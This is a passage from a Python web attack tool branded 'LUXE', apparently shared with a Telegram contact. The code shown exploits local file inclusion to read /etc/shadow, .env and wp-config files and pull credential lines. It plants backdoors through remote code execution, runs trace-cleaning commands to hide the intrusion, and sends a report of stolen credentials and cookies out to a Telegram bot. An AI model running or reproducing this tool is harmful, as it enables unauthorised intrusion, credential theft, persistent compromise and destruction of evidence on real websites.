            self._print_found("Path", f"{url} [{r.status_code}]")

        self._safe_map(check, self.admin_paths)

    def extract_files(self):
        self._print_info("Files via LFI...")
        hits = self.results.get("lfi", [])[:6]
        if not hits:
            return
        targets = [
            "/etc/passwd", "/etc/hosts", "/etc/shadow", "/proc/self/environ",
            "/var/www/html/.env", "/var/www/html/wp-config.php", "/var/www/html/config.php",
            "/var/www/html/configuration.php", "/var/www/html/.env.local",
            "/var/www/html/storage/logs/laravel.log", "/var/www/html/application/config/database.php",
        ]
        for f in targets:
            for hit in hits:
                url = f"{TARGET}?{hit['param']}={quote(f, safe='')}"
                r = self._req(url)
                if r is None:
                    continue
                body = r.text or ""
                if len(body) < 40 or body.lstrip().startswith("<!"):
                    continue
                if any(x.lower() in body.lower() for x in ["root:x:", "db_", "password", "secret", "app_key", "mysql", "define(", "DB_"]):
                    self._add("files", {"file": f, "url": url, "snippet": body[:400]})
                    self._print_found("File", f)
                    for line in body.splitlines():
                        low = line.lower()
                        if any(k in low for k in ["password", "secret", "api_key", "app_key", "db_password", "db_user", "aws_"]):
                            self._add("creds", line.strip()[:220])
                    break

    def deploy_backdoors(self):
        self._print_info("Backdoors via RCE...")
        hits = self.results.get("rce", [])[:4]
        if not hits:
            return
        for bd in self.backdoors:
            for hit in hits:
                url = f"{TARGET}?{hit['param']}={quote(bd, safe='')}"
                r = self._req(url)
                if r is not None and r.status_code == 200:
                    body = (r.text or "").lower()
                    if "permission denied" in body:
                        continue
                    self._add("backdoors", {"command": bd[:70], "url": url, "param": hit.get("param")})
                    self._print_found("Backdoor", hit.get("param", "?"))
                    break

    def clean_traces(self):
        self._print_info("Cleaning traces...")
        hits = self.results.get("rce", [])[:2]
        if not hits:
            return
        for hit in hits:
            for cmd in self.clean_cmds:
                url = f"{TARGET}?{hit['param']}={quote(cmd, safe='')}"
                self._req(url)

    def build_html(self):
        r = self.results

        def esc(x):
            return str(x).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")

        def section(title, items):
            if not items:
                return f'<div class="sec"><h2>{esc(title)}</h2><p class="empty">None</p></div>'
            rows = []
            if items and isinstance(items[0], dict):
                keys = list(items[0].keys())
                head = "<tr>" + "".join(f"<th>{esc(k)}</th>" for k in keys) + "</tr>"
                for it in items[:40]:
                    rows.append("<tr>" + "".join(f"<td>{esc(str(it.get(k, ''))[:140])}</td>" for k in keys) + "</tr>")
                return f'<div class="sec"><h2>{esc(title)} <span class="b">{len(items)}</span></h2><table>{head}{"".join(rows)}</table></div>'
            for it in items[:40]:
                rows.append(f"<tr><td>{esc(str(it)[:200])}</td></tr>")
            return f'<div class="sec"><h2>{esc(title)} <span class="b">{len(items)}</span></h2><table>{"".join(rows)}</table></div>'

        tech = ", ".join(r["technologies"]) or "—"
        return f"""<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>LUXE — {esc(r["target"])}</title>
<style>
:root{{--bg:#0a0a0f;--card:#12121a;--acc:#e94560;--txt:#e8e8f0;--mut:#8888a8;--brd:#1e1e30}}
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:Consolas,'Courier New',monospace;background:var(--bg);color:var(--txt);line-height:1.55;padding:20px}}
.w{{max-width:1100px;margin:0 auto}}
header{{border:1px solid var(--brd);background:var(--card);padding:26px 30px;border-radius:8px;margin-bottom:20px}}
header h1{{font-size:26px;letter-spacing:3px;color:var(--acc)}}
header .sub{{color:var(--mut);font-size:13px;margin-top:6px}}
.meta{{display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:10px;margin:16px 0}}
.meta div{{background:var(--card);border:1px solid var(--brd);padding:10px 14px;border-radius:6px}}
.meta span{{display:block;color:var(--mut);font-size:11px;text-transform:uppercase}}
.meta strong{{font-size:14px}}
.sec{{background:var(--card);border:1px solid var(--brd);border-radius:8px;padding:16px;margin-bottom:14px}}
.sec h2{{font-size:15px;color:var(--acc);margin-bottom:10px;display:flex;align-items:center;gap:8px}}
.b{{background:var(--acc);color:#fff;font-size:11px;padding:2px 8px;border-radius:10px}}
table{{width:100%;border-collapse:collapse;font-size:12px}}
th{{text-align:left;color:var(--mut);border-bottom:1px solid var(--brd);padding:5px 7px}}
td{{padding:5px 7px;border-bottom:1px solid #161622;vertical-align:top;word-break:break-all}}
.empty{{color:var(--mut);font-size:13px}}
footer{{margin-top:28px;padding:18px;border-top:1px solid var(--brd);display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px}}
.dev{{display:inline-block;background:var(--acc);color:#fff;text-decoration:none;padding:10px 22px;border-radius:6px;font-weight:bold;letter-spacing:1px}}
.credit{{color:var(--mut);font-size:12px}}
</style></head><body><div class="w">
<header><h1>LUXE</h1><div class="sub">SCAN Web BY LUXE &nbsp;|&nbsp; Tele Me : @LU_KT</div>
<div class="sub" style="margin-top:8px;color:#c07070">Heuristic scanner — findings need manual verification.</div></header>
<div class="meta">
<div><span>Target</span><strong>{esc(r["target"])}</strong></div>
<div><span>Time</span><strong>{esc(r["timestamp"][:19])}</strong></div>
<div><span>Technologies</span><strong>{esc(tech)[:70]}</strong></div>
</div>
{section("LFI", r["lfi"])}
{section("RCE", r["rce"])}
{section("SQLi", r["sqli"])}
{section("XSS", r["xss"])}
{section("SSRF", r["ssrf"])}
{section("XXE", r["xxe"])}
{section("SSTI", r["ssti"])}
{section("Open Redirect", r["open_redirect"])}
{section("CRLF", r["crlf"])}
{section("CSRF", r["csrf"])}
{section("CORS", r["cors"])}
{section("JWT", r["jwt"])}
{section("Admin / Paths", r["admin"])}
{section("Files", r["files"])}
{section("Creds", r["creds"])}
{section("Backdoors", r["backdoors"])}
{section("Subdomains", r["subdomains"])}
{section("Emails", r["emails"])}
{section("Technologies", r["technologies"])}
{section("Cookies", [r["cookies"]] if r["cookies"] else [])}
<footer>
<a class="dev" href="https://t.me/LU_KT">Dev</a>
<div class="credit">LUXE &nbsp;•&nbsp; @LU_KT &nbsp;•&nbsp; {esc(r["timestamp"][:19])}</div>
</footer></div></body></html>"""

    def send_report(self):
        self._print_info("Telegram...")
        if not TG_TOKEN or not TG_CHAT:
            print(c(PAL[1], "[!] Token/Chat empty — skip Telegram"))
            return
        try:
            html_doc = self.build_html()
            with open("LUXE.HTML", "w", encoding="utf-8") as f:
                f.write(html_doc)
            print(c(PAL[0], "[+] LUXE.HTML saved"))

            order = [
                "lfi", "rce", "sqli", "xss", "ssrf", "xxe", "ssti",
                "open_redirect", "crlf", "csrf", "cors", "jwt",
                "admin", "files", "creds", "backdoors",
                "subdomains", "emails", "technologies",
            ]
            lines = ["LUXE Web Scan", "", f"Target: {TARGET}", ""]
            for key in order:
                val = self.results.get(key, [])
                n = len(val) if not isinstance(val, dict) else (1 if val else 0)
                if n:
                    lines.append(f"{key}: {n}")
            lines += ["", "@LU_KT"]
            body = "\n".join(lines)

            base = f"https://api.telegram.org/bot{TG_TOKEN}"
            kb = {"inline_keyboard": [[{"text": "Dev", "url": "https://t.me/LU_KT"}]]}


            files = {"document": ("LUXE.HTML", html_doc.encode("utf-8"), "text/html")}
            data = {
                "chat_id": TG_CHAT,
                "caption": f"<pre>{body}</pre>",
                "parse_mode": "HTML",
                "reply_markup": json.dumps(kb),
            }
            resp = requests.post(f"{base}/sendDocument", files=files, data=data, timeout=60)
            if resp.ok and resp.json().get("ok"):
                print(c(PAL[0], "[+] Report file + quoted summary + Dev sent together"))
            else:
                print(c(PAL[1], f"[!] Send issue: {resp.text[:160]}"))
        except Exception as e:
            print(c(PAL[1], f"[!] Send failed: {e}"))

    def run(self):
        print(f"\n{c(PAL[0], '[+] Target: ' + TARGET)}")
        print(c(PAL[2], "[+] Starting scan...\n"))
        self._validate_target()
        self._baseline()
        self.scan_technologies()
        self.scan_subdomains()
        self.scan_emails()
        self.steal_cookies()
        self.scan_lfi()
        self.scan_rce()
        self.scan_sqli()
        self.scan_xss()
        self.scan_ssrf()
        self.scan_xxe()
        self.scan_ssti()
        self.scan_open_redirect()
        self.scan_crlf()
        self.scan_csrf()
        self.scan_cors()
        self.scan_jwt()
        self.find_admin()
        self.extract_files()
        self.deploy_backdoors()
        self.clean_traces()
        print(f"\n{c(PAL[0], '═══════════════ SUMMARY ═══════════════')}")
        for k in ["technologies", "subdomains", "emails", "lfi", "rce", "sqli", "xss", "ssrf", "xxe", "ssti", "open_redirect", "crlf", "csrf", "cors", "jwt", "admin", "files", "creds", "backdoors"]:
            n = len(self.results[k]) if not isinstance(self.results[k], dict) else (1 if self.results[k] else 0)
            if n:
                print(c(PAL[0], f"  {k:16} : {n}"))
        print(c(PAL[0], "═══════════════════════════════════════\n"))
        self.send_report()
        print(c(PAL[0], "\n[+] Scan complete!\n"))


if __name__ == "__main__":
    scanluxe().run()